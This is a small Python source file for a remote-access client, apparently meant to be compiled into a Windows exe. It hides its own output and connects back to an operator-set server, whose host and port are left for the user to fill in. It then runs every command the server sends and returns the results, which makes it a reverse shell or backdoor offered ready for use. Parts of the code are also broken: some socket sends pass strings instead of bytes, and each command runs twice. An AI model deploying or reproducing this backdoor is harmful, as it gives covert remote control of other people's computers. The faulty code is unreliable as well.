"""
Compiled to an exe if you are on windows, if you are linux you can set it up with python3 client.py.
This is the client side of the program, it will connect to the server and send the data to it.
The server can use the client to execute commands, tranfser files, and more.
"""

import socket
import subprocess
import time
import sys
import os

# EDIT HOST, PORT TO YOUR SERVER SETTINGS

HOST = "127.0.0.1"
PORT = 25565

# DONT EDIT BELOW

sys.stdout = open(os.devnull, "w")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
sock.connect((str(HOST), int(PORT)))

no_output = ['cd']

while True:
    cmd = sock.recv(1024).decode()

    if cmd == '$close':
        sock.send("Exiting Client")
        sock.close()
        break
        
    if cmd in no_output:
        sock.send("OK")

    os.system(command=str(cmd))
    sock.send(subprocess.getoutput(cmd).encode())
    
    
